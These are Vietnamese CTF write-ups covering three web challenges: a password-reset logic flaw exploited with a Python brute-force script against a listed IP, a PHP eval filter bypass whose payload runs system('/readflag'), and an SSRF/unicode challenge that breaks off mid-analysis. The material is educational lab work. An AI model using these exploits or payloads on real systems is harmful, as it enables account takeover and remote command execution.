# 2. Giải thích luồng hoạt động 

Trước tiên mình sẽ giải thích sơ qua về code và luồng hoạt động của chúng 

File `auth.js` chịu trách nhiệm **Đăng ký** , **Đăng nhập** , và **Đăng xuất**.

***Chức năng Đăng ký***

```python
router.post('/register', async (req, res) => {
    const { username, password, email } = req.body;
```
`router.post('/register', ...)` : Định nghĩa đường dẫn đăng ký . Dùng phương thức POST 

`const { ... } = req.body` : Lấy thông tin người dùng gửi lên từ form đăng ký ( gồm tên , mật khẩu , email ).

```python
try {
        const hashedPassword = await bcrypt.hash(password, 10);
``` 
`bcrypt.hash(password, 10)` : Đây là bước quan trọng nhất 

- Nó lấy mật khẩu người dùng nhập 
- Nó băm nát mật khẩu đó ra 10 lần 
- Kết quả `hashedPassword` sẽ là một chuỗi vô nghĩa . Điều này giúp bảo mật , kể cả Admin hay Hacker vào được Database cũng biết mật khẩu thật

```python
db.query(
            'INSERT INTO users (username, password, email, role) VALUES (?, ?, ?, ?)',
            [username, hashedPassword, email, 'user'],
            (error, results) => {
```
`db.query(...)`: Gửi lệnh vào Database MySQL.

`INSERT INTO users ...` : Lệnh thêm người dùng mới vào bảng `users`

`VALUES (?, ?, ?, ?)` : Các dấu `?` sẽ được thay thế bằng dữ liệu thật ở dòng dưới. Việc này giúp chống lại lỗi SQL Injection cơ bản 

`'user'` : Mặc định ai đăng ký cũng chỉ là user thường, không được làm `admin`.

***Chức năng đăng nhập***

```python
router.post('/login', (req, res) => {
    const { username, password } = req.body;
```
Nhập tên và mật khẩu người dùng gửi lên để đăng nhập

```python
db.query(
        'SELECT * FROM users WHERE username = ?',
        [username],
        async (error, results) => {
```
`SELECT * FROM users ...` : Tìm trong db xem có ai tên giống `username` người dùng nhập không

```python
const user = results[0];
            const match = await bcrypt.compare(password, user.password);

            if (!match) {
                return res.status(401).json({ error: 'Invalid credentials' });
            }
```
`bcrypt.compare(...)`: So sánh mật khẩu.

```python
req.session.user = {
                id: user.id,
                username: user.username,
                email: user.email,
                role: user.role
            };

            res.json({ success: true, message: 'Login successful!', role: user.role });
```

`req.session.user = ...` : Server lưu thông tin của người này vào bộ nhớ phiên làm việc (Session). Từ giờ trở đi, mỗi khi gửi request, Server sẽ kiểm tra req.session để biết là ai, có phải Admin không.

File `resetPassword.js` : File này nhận yêu cầu từ người dùng (HTTP Request).

```python
router.post('/resetpassword', (req, res) => {
    const { username, email, passwordnew, code_reset } = req.body;

    if (!username || !email) {
        return res.status(400).json({ error: 'Username and email are required' });
    }
```
Hàm này xử lý yêu cầu gửi đến đường dẫn `/resetpassword`.

Nó lấy 4 thông tin từ người dùng: **Tên**, **Email**, **Mật khẩu mới**, và **Mã reset** (nếu có).

**Lỗ hổng logic đầu tiên : Kiểm tra tài khoản** 

```python
const validateQuery = 'SELECT 1 FROM users WHERE username = ? UNION SELECT 2 FROM users WHERE email = ?';
    
    db.query(validateQuery, [username, email], (error, results) => {
        // ... (xử lý lỗi database) ...

        if (results.length !== 2) {
            return res.status(400).json({ error: 'Invalid username or email' });
        }
```
`UNION` : CÂU LỆNH SQL GHÉP KẾT QUẢ 

 - Vế 1: Tìm xem `username` có tồn tại không?
 - Vế 2: Tìm xem `email` có tồn tại không?

Nó không kiểm tra mối liên hệ. Bạn có thể nhập username của Admin nhưng email của Hacker. Cả 2 đều tồn tại trong hệ thống (ở 2 tài khoản khác nhau), nên kết quả vẫn là 2 dòng -> Hệ thống bị lừa và cho qua!

```python
if (!code_reset || code_reset === '') {
            let newResetCode;
            // KIỂM TRA EMAIL ĐỂ CHỌN ĐỘ KHÓ CỦA MÃ
            if (email.toLowerCase().includes('admin')) {
                newResetCode = uuidv4(); // Mã khó (nếu email chứa chữ 'admin')
            } else {
                // LỖ HỔNG SỐ 2: TẠO MÃ YẾU
                const randomLetter = String.fromCharCode(65 + Math.floor(Math.random() * 6));
                const randomNumbers = Math.floor(10 + Math.random() * 90);
                newResetCode = randomLetter + randomNumbers + randomLetter;
            }            
            
            // Lưu mã vào Database
            updateCodeReset(username, email, newResetCode, (error, resetCode) => {
                // ... Trả về thông báo thành công ...
            });
```
Đoạn code này sẽ tạo mã reset , lúc này `code_reset` để trống 

Vì bạn nhập email là `test1@gmail.com` (không chứa chữ "admin"), code nhảy vào nhánh else.

Công thức tạo mã yếu:
 - `randomLetter`: Chọn 1 chữ cái từ A-F (65 + random*6).
 - `randomNumbers`: Chọn số từ 10-99.

`updateCodeReset`: Lưu cái mã yếu xìu này vào Database, gắn với username là admin (do lỗ hổng số 1 ở trên đã cho qua user admin).

---
# 3. Phân tích và khai thác

Ban đầu, khi nhìn vào source code, đặc biệt là file auth.js, mình thấy quy trình đăng nhập rất chặt chẽ:

- Mật khẩu được mã hóa bằng bcrypt (một thuật toán băm rất mạnh, không thể dịch ngược).
 - Câu lệnh SQL sử dụng `?` nên không thể sử dụng kỹ thuật **SQL Injection** cơ bản (như `' OR 1=1 --`) để vượt qua bước đăng nhập.

**Kết luận**: Tấn công trực tiếp vào trang Login là bất khả thi. Cần chuyển hướng sang các tính năng khác.

***Phát hiện Lỗ hổng Logic***

Khi đọc **file** `resetPassword.js`, ta phát hiện ra 2 vấn đề nghiêm trọng nằm cạnh nhau:

- Hệ thống sử dụng câu lệnh UNION để kiểm tra thông tin trước khi reset mật khẩu:
  
  - UNION là lệnh SQL dùng để gộp kết quả của 2 câu lệnh SELECT lại với nhau.
  - Code chỉ đếm số dòng trả về (length === 2). Nó kiểm tra xem "User có tồn tại không?" VÀ "Email có tồn tại không?" một cách tách biệt. Nó QUÊN kiểm tra xem Email đó có thực sự thuộc về User đó hay không.
- Sinh mã xác thực yếu

  - Ngay sau khi vượt qua bước kiểm tra trên, code có đoạn tạo mã xác thực (OTP)
  - Vấn đề: Nếu email nhập vào KHÔNG chứa chữ **"admin"**, hệ thống sẽ tạo ra một mã rất ngắn và dễ đoán, thay vì dùng mã chuẩn `uuidv4`.

Đến đây , mình sẽ nói sơ lược quy trình tấn công như sau : 

Để vượt qua câu lệnh `UNION`, ta cần một **email** tồn tại trong hệ thống nhưng không được chứa chữ **admin** (để kích hoạt lỗ hổng sinh mã yếu).

Thực hiện: Truy cập `/register` **đăng ký** tài khoản mới.

 - User: `test10`
 - Email: `test10@gmail.com`

Tiếp theo , đánh lừa hệ thống như sau :
 
 - Truy cập chức năng **Reset Password**
 - Nhập `username` : `admin`
 - Nhập `email` vừa mới tạo : `test10@gmail.com`
 - Ô `Reset Code` : để trống -> để nó còn gửi mã về 
 - Nhập `New Password` : `12345678`

**Kết quả** : 
 
- `SELECT... username='admin'` -> Tìm thấy (1 dòng).
- `SELECT... email='test10@gmail.com'` -> Tìm thấy (1 dòng).
- Tổng = 2 dòng -> Hệ thống cho phép đi tiếp.
- Email `test10@gmail.com` không chứa chữ **"admin"** -> Hệ thống tạo mã yếu và lưu vào Database cho user admin.

Cuối cùng , dò Reset Code bằng burpsuite 😅

Sau khi có passcode gửi đi thì mình nhập một giá trị bất kì : A10A vào ô Reset Code , rồi dùng burpsuite bắt request đó lại 
 
 - Tiếp tục lấy request vừa bắt được `Add to Instruder` 
 - Trong thẻ Positions của Intruder:
  
   - Attack type: Chọn Cluster bomb.
   - Bôi đen cho 3 vị trí riêng biệt , vị trí đầu là chữ A , vị trí thứ 2 là số 10 , vị trí thứ 3 là chữ A , rồi lần lượt ấn nút **add** cho từng vị trí 
   - Chuyển sang thẻ **Payload** 
   - Payload set: 1 -> Type: Simple list -> Nhập thủ công các chữ cái từ A đến F (A, B, C, D, E, F).
   - Payload set: 2 (Vị trí số ở giữa) -> Type: Numbers -> `From: 10` `To: 99` `Step: 1`
   - Payload set: 3 (Vị trí chữ cái cuối) -> Giống hệt cái đầu 
- Và rồi start attack 

Tuy nhiên cách này khá may rủi , bởi vì passcode chỉ có hiệu lực trong vòng 5 phút mà tổng số request có thể sẽ phải gửi là 6 x 90 x 6 = 3240 requests , cho nên nếu hên , chữ cái đầu tiên mà bắt đầu bằng chữ **A** thì may ra đổi được password mới , và mình đã phải thử đi thử lại nhiều lần liên tục sau mỗi 5 phút 🙂 

Cách 2 : Bạn nhờ ***GEMINI*** viết đoạn code Python , là cách chuẩn chỉ nhất

Đây là đoạn code của nó 
```python
import requests
import itertools
import string
import sys

# CẤU HÌNH
URL = "http://14.225.220.66:5018"  # Điền đúng địa chỉ IP:PORT của bài
MY_EMAIL = "test10@gmail.com"       # Email bạn đã đăng ký và dùng để lừa server
TARGET_USER = "admin"
NEW_PASSWORD = "12345678
"

# Session dùng để giữ kết nối (Cookie)
s = requests.Session()

def trigger_reset_code():
    """Bước 1: Gửi yêu cầu để server tạo mã yếu"""
    print(f"[*] Đang gửi yêu cầu reset password cho {TARGET_USER} với email {MY_EMAIL}...")
    url = f"{URL}/resetpassword"
    data = {
        "username": TARGET_USER,
        "email": MY_EMAIL,
        "code_reset": ""  # Để rỗng để tạo mã mới
    }
    
    try:
        r = s.post(url, json=data)
        if "Reset code generated" in r.text:
            print("[+] Thành công! Server đã tạo mã yếu và lưu vào DB.")
            return True
        else:
            print(f"[-] Thất bại: {r.text}")
            return False
    except Exception as e:
        print(f"[-] Lỗi kết nối: {e}")
        return False

def brute_force():
    """Bước 2: Dò mã reset (A10A -> F99F)"""
    print("[*] Bắt đầu Brute-force mã reset...")
    
    # Tạo danh sách ký tự cần dò
    chars = ['A', 'B', 'C', 'D', 'E', 'F']  # Math.random() * 6
    numbers = range(10, 100)                # 10 -> 99
    
    # Tổng số trường hợp: 6 * 90 * 6 = 3240
    total = len(chars) * len(numbers) * len(chars)
    count = 0
    
    url = f"{URL}/resetpassword"
    
    # Vòng lặp dò mã: Chữ đầu -> Số giữa -> Chữ cuối
    for c1 in chars:
        for n in numbers:
            for c2 in chars:
                code = f"{c1}{n}{c2}" # Ví dụ: A10A
                count += 1
                
                # In tiến trình mỗi 500 lần thử cho đỡ rối mắt
                if count % 500 == 0:
                    print(f"    Đang thử: {code} ({count}/{total})")
                
                data = {
                    "username": TARGET_USER,
                    "email": MY_EMAIL,
                    "passwordnew": NEW_PASSWORD,
                    "code_reset": code
                }
                
                try:
                    r = s.post(url, json=data)
                    
                    # Nếu server trả về success (hoặc password reset successful)
                    if "success" in r.text and "true" in r.text:
                        print(f"\n[!!!] BINGO! Tìm thấy mã đúng: {code}")
                        print(f"[+] Mật khẩu admin đã đổi thành: {NEW_PASSWORD}")
                        print("[+] Hãy vào đăng nhập ngay!")
                        return True
                        
                except Exception as e:
                    pass

    print("\n[-] Đã thử hết mã mà không thành công. Có thể mã đã hết hạn.")
    return False

if __name__ == "__main__":
    if trigger_reset_code():
        brute_force()
```

Khi đã hoàn thành , thì nó tự động thoát , nó tự làm cả bước xin mã và nhập mã rồi cho nên sau khi thoát thì mất khẩu admin đã được đổi thành 12345678 

Bây giờ login lại vào `username` : `admin` và `password` : `12345678` và lấy flag thôi 

`flag : KCSC{G0tt4_h4ck_'3m_4ll!}`

---
# 3. Bài học rút ra 

- Đừng chỉ tìm lỗi cú pháp (Syntax Error): thấy code dùng Prepared Statement (?) là bỏ qua, nghĩ rằng không Hack được SQL Injection.
- Đọc kỹ Source Code (Whitebox): Những lỗi logic như UNION hay công thức Math.random * 6 rất khó phát hiện nếu chỉ scan từ bên ngoài (Blackbox), nhưng lại hiện nguyên hình khi chịu khó đọc code.



# Write up: Secure share

# 1.Mục tiêu 
Challenge này cho một thanh input để nhập URL vào và chuyển sang thành QR Code 

Mục tiêu của bạn là tìm ra cách đọc file flag bằng cách tìm ra lỗ hổng trong mã nguồn được challenge cho 


# 2.Giải thích source code

( Mình sẽ giải thích sơ qua vài cái hàm lạ khó hiểu trong này , bạn nào hiểu rồi thì có thể tua xuống dưới nha )

Hàm `preg_match_all` mục đích của nó là tìm kiếm trong cái input mà bạn truyền vào ấy , nó có cái nào khớp với điều kiện do người lập trình đề ra hay không , nếu có thì trả về kết quả vào 1 biến 

Cú pháp của nó là : `preg_match_all (pattern , input , matches)` 

ví dụ với dòng code trong bài : 
```python
if (preg_match_all('/([\w]+)([\x00-\x1F\x7F\/\*\<\>\%\w\s\\\\]+)?\(/i', $input, $matches2))
```

Giả sử bạn nhập vào **input** = `abcd%123(` thì nó sẽ tách ra như thế này 

Phần đầu : `('/([\w]+)` , nó sẽ chỉ quét đến đoạn nào mà vẫn còn chữ hoặc số -> Phần đầu nó sẽ lấy `abcd`

Phần 2 : `([\x00-\x1F\x7F\/\*\<\>\%\w\s\\\\]+)?` , nó sẽ dò các kí tự rác , thì kí tự rác ở đây nó sẽ lấy bắt đầu từ `%` -> phần 2 sẽ là : `%123` 

Và cái cuối cùng : `\(/i'` : nó sẽ chỉ lấy dấu `(` 

Hàm `trim()` : cắt bỏ các khoảng trắng bị dính ở đầu hoặc ở đuôi chuỗi . giả sử bạn nhập và " abcd " thì sau khi đi qua trim() thì nó sẽ chỉ còn "abcd"

Hàm `function_exists(..)` : hàm có sẵn trong php , nó có chức năng nhận biết tên hàm có sẵn trong php 

Ok bây giờ vào vấn đề chính , giải thích **file** `security_filter.php` trong bài : 

```python
<?php

// Current security check function
function security_check($input, $white_fun = [])
{
    if (preg_match_all('/([\w]+)([\x00-\x1F\x7F\/\*\<\>\%\w\s\\\\]+)?\(/i', $input, $matches2)) {
        foreach ($matches2[1] as $value) {
            if (function_exists(trim($value)) && !in_array($value, $white_fun)) {
                return false;
            }
        }
    }

    $blacklist_pattern = '/(\([\w\s\.]+\))|(\$_GET\[)|(\$_POST\[)|(\$_REQUEST\[)|(\$_COOKIE\[)|(\$_SESSION\[)|(file_put_contents)|(file_get_contents)|(fwrite)|(phpinfo)|(base64)|(`)|(shell_exec)|(eval)|(assert)|(system)|(exec)|(passthru)|(pcntl_exec)|(popen)|(proc_open)|(print_r)|(print)|(urldecode)|(chr)|(include)|(require)|(request)|(__FILE__)|(__DIR__)|(copy)|(call_user_)|(preg_replace)|(array_map)|(array_reverse)|(array_filter)|(getallheaders)|(get_headers)|(decode_string)|(htmlspecialchars)|(session_id)|(strrev)|(substr)|(\)\s*\()|(\.)|(\x5c)|(\bnew\b)|(Reflection)|(invoke)|(#)|(readfile)|(glob)|(scandir)|(var_dump)/i';

    if (preg_match($blacklist_pattern, $input, $matches)) {
        return false;
    }

    return true;
}
```
khởi tạo hàm `security_check` nhận 2 tham số là `input` và  mảng `white_fun` , tiếp tục giá trị input được truyền vào trong `preg_match_all` nó sẽ chỉ lấy cái Phần 1 của `input` , tức là cái `input` bạn nhập vào nó sẽ lấy những ký tự toàn chữ số cho đến khi gặp ký tự lạ thì nó ngắt không lấy nữa ( mình đã giải thích phần 1 là gì ở trên ) , mục đích ở đây là lấy tên hàm rồi gán vào `$matches[1]` và đưa đi kiểm tra xem tên hàm đó có tồn tại hay không và tên hàm đó có nằm trong danh sách trắng hay không

Nếu có tồn tại && không nằm trong danh sách cho phép thì sẽ `return false` 

Tiếp theo đi qua cái `blacklist_pattern` , tương tự như trên , nếu quét cái input bạn truyền vào mà phát hiện trùng khớp với blacklist thì sẽ trả về false 

Còn khi mà đã thỏa mãn 2 điều kiền trên thì trả về true 

Tiếp theo qua `index.php` 

```python
function sys_pref_region()
{
    static $cached_region = null;
    if ($cached_region !== null) {
        return $cached_region;
    }

    if (isset($_GET['region'])) {
        $r = $_GET['region'];

        if (!preg_match('/^[a-z]+$/i', $r)) {
            $r = 'en';
        }
        setcookie('sys_region', $r, time() + (86400 * 365), '/');
    } elseif (isset($_COOKIE['sys_region'])) {
        $r = $_COOKIE['sys_region'];
        if (!preg_match('/^[a-z]+$/i', $r)) {
            $r = 'en';
        }
    } else {
        $r = $_SERVER['HTTP_CF_IPCOUNTRY'] ?? 'en';
        setcookie('sys_region', $r, time() + (86400 * 365), '/');
    }

    $cached_region = $r;
    return $r;
}
```
hàm này lấy dữ liệu trực tiếp từ tham số `?region=...` trên url , kiểm tra xem trên url có tham số ?region=... hay không 

- `/^[a-z]+$/i` : để mình giải thích chi tiết đoạn này thì cái `^` và `$` tức là bắt buộc từ đầu đến cuối chuỗi , `[a-z]+` là chỉ chấp nhận các ký tự chữ cái `a` đến `z`  , `+` đó tức là có thể lặp đi lặp lại , và chữ `i` cuối cùng tức là ko phân biệt hoa thường 

- tức là cái mà bạn nhập vào cho tham số `region` ấy , nó phải bắt buộc là chữ cái , không được là số ko được là ký tự đặc biệt ( *hãy để ý đoạn này , chút nữa sẽ rất cần thiết ) 

và rồi cái hàm `sys_pref_region()` nó sẽ return về `$r` và biến r lại được gán với cái đối số bạn truyền vào tham số `region` ở trên ( đoạn code này bạn cứ hiểu nôm na là vậy ) 

```python
public function parse_qr_tags($content)
    {
        global $qr_url, $show_qr;

        $pattern = '/\{sys:qrcode(\s+[^}]+)?\}/';

        if (preg_match_all($pattern, $content, $matches)) {
            $count = count($matches[0]);
            for ($i = 0; $i < $count; $i++) {
                $html = '';

                if ($show_qr && !empty($qr_url)) {
                    $html = '<img src="?genqr=' . urlencode($qr_url) . '" style="border:1px solid #0f0; padding:5px;">';
                } else {
                    $html = '<form method="POST" style="margin: 20px 0;" autocomplete="off">
                        <input type="text" name="url" placeholder="Enter URL to generate QR code" autocomplete="off"
                               style="width: 70%; padding: 12px; background: rgba(0, 20, 0, 0.8); 
                               border: 2px solid #0f0; color: #0f0; font-family: \'Courier New\', monospace; 
                               font-size: 1em; border-radius: 5px;" required>
                        <button type="submit" 
                                style="padding: 12px 25px; background: rgba(0, 255, 0, 0.2); 
                                border: 2px solid #0f0; color: #0f0; cursor: pointer; 
                                font-family: \'Courier New\', monospace; font-size: 1em; 
                                border-radius: 5px; margin-left: 10px; transition: all 0.3s;" 
                                onmouseover="this.style.background=\'rgba(0, 255, 0, 0.4)\'" 
                                onmouseout="this.style.background=\'rgba(0, 255, 0, 0.2)\'">
                            Generate QR
                        </button>
                    </form>';
                }

                $content = str_replace($matches[0][$i], $html, $content);
            }
        }
        return $content;
    }
```

tiếp tục là hàm `parse_qr_tags($content)`

nó sẽ nhận cái từ lấy $content rồi đưa qua preg_match_all để lọc , cái đoạn này `$pattern = '/\{sys:qrcode(\s+[^}]+)?\}/';` đây chính là những điều kiện kiểm tra pattern ở bên `parse_qr_tags()` , mình giải thích từng chi tiết một cho các bạn dễ hiểu 

- `{sys:qrcode` : bắt buộc chữ đầu phải là chữ {sys:qrcode

- `(\s+[^}]+)?` : cục này là 1 , bạn có thể hiểu đây như là nội dung chính 

  - `\s+` : ở sau cái chữ `{sys:qrcode` phải là một dấu cách 

  -  `[^}]+` : tức là mọi ký tự như thế nào cũng đều được ngoại trừ dấu } , 

- `\}/` : và phải kết thúc bằng dấu } 

một `$content` hợp lệ sẽ có dạng là `{sys:qrcode abc}` , dạng dạng như thế , rồi khi đi qua cái `preg_match_all` thì sẽ trả về kết quả hợp lệ cho `$matches` và cái `$matches[0]` sẽ lấy nguyên luôn cả cục `{sys:qrcode abc}` , rồi ở đây nếu mà hợp lệ thì nó sẽ tạo 1 qr code ra màn hình cho các bạn 


```python
public function parse_logic_gates($content)
    {
        $pattern = '/\{sys:gate\(([^}^\$]+)\)\}([\s\S]*?)\{\/sys:gate\}/';

        if (preg_match_all($pattern, $content, $matches)) {
            $count = count($matches[0]);

            for ($i = 0; $i < $count; $i++) {
                $flag = '';
                $out_html = '';


                $white_fun = array('date', 'sys_pref_region');

                $matches[1][$i] = $this->restorePreLabel($matches[1][$i]);


                if (!security_check($matches[1][$i], $white_fun)) {
                    die('Security violation detected!');
                }

                @eval ('if(' . $matches[1][$i] . '){$flag="if";}else{$flag="else";}');

                if ($flag == 'if') {
                    $out_html = $matches[2][$i];
                }
                $content = str_replace($matches[0][$i], $out_html, $content);
            }
        }
        return $content;
    }
``` 

đây mới chính là hàm cần chú ý , tôi sẽ giải thích chi tiết nhất cho các bạn 

đầu tiên là cái pattern  `$pattern = '/\{sys:gate\(([^}^\$]+)\)\}([\s\S]*?)\{\/sys:gate\}/';`

nếu muốn `$content` có thể khớp với `$pattern` thì : 

- `{sys:gate` : bắt đầu phải bằng `{sys:gate` 

- `\(([^}^\$]+)\)\}` : đây sẽ là `matches[1]` - nơi bạn sẽ đưa payload vào  , nó bắt bạn sau `{sys:gate` phải là dấu `(` ,  và ở sau thì tất cả mọi ký tự đều được trừ `}` , `^` và `$` , ở cuối phải dấu `)` , và `}` 

ví dụ : `{sys:gate(abc)}`

- `([\s\S]*?)` : khúc này là `matches[2]` , nó yêu cầu phải có khoảng trắng ở ở sau `{sys:gate(abc)}` phải là một khoảng trắng rồi điền bất cứ thứ gì ở sau khoảng trắng đó đều được 

ví dụ : `{sys:gate(abc)} 123`

- `\{\/sys:gate\}/` : sau `{sys:gate(abc)} 123` phải là `{/sys:gate}` 

vậy cấu trúc của `$content` cần sẽ là : `{sys:gate(abc)} 123{/sys:gate}` dạng như thế 

để mình nói thêm về cái `matches[0]` và `matches[1]` đấy , giả sử bạn truyền vào `{sys:gate(abc)} 123{/sys:gate}` thì `matches[0]` sẽ lấy nguyên cảm cụm `{sys:gate(abc)} 123{/sys:gate}` còn `matches[1]` sẽ chỉ lấy `abc` và tương tự `matches[2]` nó sẽ lấy `123`

và một điều nữa , giả sử bạn truyền vào 
```
{sys:gate(abc)} 123{/sys:gate}
{sys:gate(bcd)} 345{/sys:gate}
```
thì lúc này `{sys:gate(abc)} 123{/sys:gate}` sẽ là `matches[0][0]` và `{sys:gate(bcd)} 345{/sys:gate}` sẽ là `matches[0][1]`

rồi tiếp khởi tạo 1 biến `count` để đếm số `$matches[0]` , cho vòng lặp chạy từ i=0 cho cho đến < `count` , ở đây có mảng `$white_fun` , trong đây là danh sách những hàm được phép đi qua `security_check()` ở đầu bài , nó bao gồm hàm `date` và `sys_pref_region` 

tiếp theo sẽ lấy `$matches[1][$i]` , đưa vào hàm `security_check()` , nếu mà nó đi qua được thì sẽ sử dụng hàm `eval` (*eval() Nó nhận vào một chuỗi văn bản, và ép máy tính phải hiểu đó là lệnh lập trình.) 

# 3.Khai thác 

Ta cùng tư duy từ dưới lên : chỉ có thể khai thác từ cái `eval()` bởi vì đó là nơi duy nhất thực thi nội dung truyền vào 

Tiếp tục , nó lại sử dụng `$matches[1]` , mà `$matches[1]` phải đi qua hàm `security_check()` 

`security_check()` lại chỉ cho 2 hàm đi qua đó chính là `date` và `sys_pref_region() `

chúng ta cùng coi lại hàm `sys_pref_region()` , nó sẽ nhận đối số truyền vào tham số `region` rồi trả về chính cái truyền vào đấy

vậy tức là , nếu mà chúng ta có thể tham số region thì hàm `sys_pref_region()` sẽ in ra chuỗi system 

nhưng mà chưa hết , bởi vì biến $content là nơi chúng ta sẽ truyền payload vào , mà nó phải đi qua preg_match_all với pattern `/\{sys:gate\(([^}^\$]+)\)\}([\s\S]*?)\{\/sys:gate\}/` 

thì như đã phân tích ở trên chúng ta chỉ cần `{sys:gate(payload)} 123{/sys:gate}` cấu trúc dạng như thế là sẽ qua , nhưng cần lưu ý cái `preg_match_all` nó kiểm tra rất gay gắt , nó cho phép mọi kí tự ngoại trừ `}` , `^` , `$` nghĩa là không thể dùng các biến thông thường như là `$_GET` , `$cmd` ,...

vì vậy chúng ta buộc phải làm gián tiếp đó chính là gọi hàm `sys_pref_region()` nó trả về chuỗi `system` nhờ `?region=system` 

vậy tức là payload lúc này sẽ là `{sys:gate(sys_pref_region())} 123{/sys:gate}` thì nó sẽ trả về dạng `{sys:gate(system)} 123{/sys:gate}` 

và vì system đó cũng sẽ là `matches[1]` nên khi ghép vào đoạn eval() đó sẽ là : 
`@eval ('if(' system '){$flag="if";}else{$flag="else";}');`

bây giờ để biến chuỗi 'system' thành 1 hàm thì chúng ta cần cung cấp thêm cho nó cặp dấu ngoặc và thêm 1 thứ nữa để đọc flag đó chính là đoạn `('/readflag')` nối ngay phía sau 

vì sao lại là '/readflag' chứ không phải là `cat /flag` hay cái gì ? cái này mình cũng không rõ 😅 . nhưng dùng `/readflag` là bởi vì trong file tải về thấy có 1 file là `readflag.c` , file này là 1 file chương trình , nếu viết `system('/readflag')` thì nó sẽ kích hoạt chương trình đó chạy , và bạn không thể viết là `system('/flag.txt')` được vì máy tính sẽ hiểu  lỗi là chạy 1 file văn bản như phần mềm 

vậy tóm lại payload cuối cùng sẽ là 
`?region=system&a={sys:gate(sys_pref_region()('/readflag'))}123{/sys:gate}`



# Write up: Simple web 

Challenge này cho một giao diện web đăng nhập , nhiệm vụ là phải leo role admin và đọc được file flag 

<img width="573" height="654" alt="image" src="https://github.com/user-attachments/assets/563fcd2e-0b2d-40cc-8bf5-fa08374dab71" />

Gợi í đầu tiên trong chall này được đưa ra là `unicode normalize` , mình search thử để xem `unicode normalize` là cái gì ?

Theo wikipedia, thì đây là tính năng để đưa những form ký tự gần giống na ná nhau đưa về cùng 1 ký tự chuẩn . ví dụ ①②③④ thì sẽ đưa về chuẩn là 1234

Áp dụng vào bài này thì mình thử tạo 1 tài khoản đăng kí là dùng username là : `ad'min` 

<img width="488" height="733" alt="image" src="https://github.com/user-attachments/assets/1225677f-a79e-41f1-b253-5caeceaa52ce" />


Đăng kí thành công , rồi mình thử đăng nhập lại vào bằng username là : `admin` có được hay không thì kết quả là đã leo được lên role admin

<img width="400" height="400" alt="image" src="https://github.com/user-attachments/assets/6ca39409-0a2d-4b35-83c5-002070c5e737" />

Tiếp tục lại có 1 gợi í hiện ra , ` Security Notice: You can only read /flag with local access` là chỉ có đọc file chứa flag với local access , mình thử với 1 câu lệnh đơn giản là `http://localhost:5021/flag` thì nó trả về `You can not access the flag directly` 

<img width="400" height="400" alt="image" src="https://github.com/user-attachments/assets/49ef5539-7eec-4b35-942d-277b9ab26a70" />

Lúc này vẫn chưa có thêm manh mối gì , mình dùng burpsuite để test lại cho dễ 

-  `url=http://127.0.0.1:5021/flag` ->  `Not allowed URL`
-  `url=http://localhost:5021/app.py` -> trả về rỗng
-  `url=http://localhost:5021/flflagag` -> trả về rỗng
-  `url=http://localhost:5021/ⒻⓁⒶⒼ` -> trả về rỗng tức là backend nó không tự động chuẩn hóa thành từ flag

Sau khi test một hồi mà không đem lại được gì thì mình thử hướng khác , sửa method POST -> GET , rồi sửa /admin -> /flag , thêm X-Forwared-For: 127.0.0.1

<img width="400" height="321" alt="image" src="https://github.com/user-attachments/assets/71d16965-2fd3-4d6a-a9ed-cd082ff0562e" />

nhưng kết quả là <img width="413" height="244" alt="image" src="https://github.com/user-attachments/assets/3525c7e3-ae3e-4564-aed9-30c878a7fd9f" />

vậy thì khả năng cao là backend nó sử dụng biến môi trường để nhận dạng , cho nên cách này coi như bỏ , mình vào lại web thử vào source code coi có gì không , thì chẳng thấy gì đáng ngờ cả 

<img width="400" height="400" alt="image" src="https://github.com/user-attachments/assets/112408c9-4d7c-49ca-b4a9-c97c63a54e73" />


vào lại burpsuite , mình thử nhập một đường dẫn có trong source code lúc nãy đó là `/static/css/style.css` để xem , nếu nhập 1 đường dẫn tồn tại thì nó sẽ hiện lên như thế nào 
`http://localhost:5021/static/css/style.css` thì một lần nữa mình lại nhận về rỗng , nhưng lúc này minh nghĩ , rõ ràng là cái đường dẫn này nó có tồn tại đó mà sao nó không hiện ra như vầy 
<img width="400" height="300" alt="image" src="https://github.com/user-attachments/assets/53e72b23-1d2d-44f6-851f-5e799573043e" />

lúc này mình mới nghĩ , có thể cái cổng 5021 chỉ là cổng để giao tiếp với người dùng còn cổng thực sự không phải 5021 , bạn có thể hình dung là , khi mà bạn gửi `http://localhost:5021` lên server thì server nó sẽ nhận lệnh này , nó thấy localhost nên server sẽ tự truy cập vào chính nó , dạng dạng thế nhưng mà trong 1 server thì sẽ có cổng dùng để giao tiếp với người dùng còn 1 cổng thì có thể làm dùng nội bộ 

cho nên lúc này mình đã thử lần lượt các cổng hợp lệ như là 8000 , 5000 , 8080 , 80 ,... một vài cổng quen thuộc trước và vẫn sử dụng url cũ `http://localhost:5021/static/css/style.css` , bởi vì nếu gặp cổng đúng với cổng nội bộ của nó thì nội dung trong đường dẫn này sẽ hiện ra 

và kết quả là khi mình thử đến cổng 80 thì : 

<img width="1000" height="600" alt="image" src="https://github.com/user-attachments/assets/2c87debf-eb7b-4a78-ac26-732c584ff9fd" />

vậy tức là cổng 80 sẽ là cổng dùng để giao tiếp nội bộ , rồi mình lại thử lại `http://localhost:80/flag` nhưng nó vẫn cứ báo `You can not access the flag directly` , vậy thì khả năng bộ lọc nó đã chặn từ flag rồi , mà cũng không thể dùng các kí tự na ná flag tại vì backend nó không chuẩn hóa kí tự lại 

lúc này mình lại thử dùng rút gọn link lại thành 1 link không chứa từ flag cho nên có thể bypass bộ lọc vào server , vào được server thì bản chất của cái link rút gọn kia vẫn là `http:localhost:80/flag` cho nên nó sẽ tự truy cập vào và lấy flag , lý thuyết là vậy nhưng kết quả nó trả về lại là 


<img width="1408" height="751" alt="image" src="https://github.com/user-attachments/assets/278fd6c0-337d-4834-a86d-835130b20dde" /> không thể khai thác thêm được gì hết , vậy cách rút gọn link này cũng coi như bỏ 

mình lại nghĩ lại với cái gợi í ban đầu `unicode normalize` thì thấy bây giờ thứ cần vượt qua là flag , lí do lúc đầu mình dùng `/ⒻⓁⒶⒼ` mà nó ko chuẩn hóa lại thành flag thì có thể là do cái thư viện hoặc cái backend ở sau nó ko hỗ trợ chuẩn hóa dạng kia , vậy thì mình thử nạp vào cho nó đủ loại kiểu kí tự thường gặp để xem coi nó sẽ chuẩn hóa dạng nào thì sẽ được thôi , tại vì cái bước bypass bộ lọc từ `flag` thì sẽ chắc chắn luôn qua được rồi , thêm nữa cụm từ `localhost:80` thì luôn được cho đi qua thôi

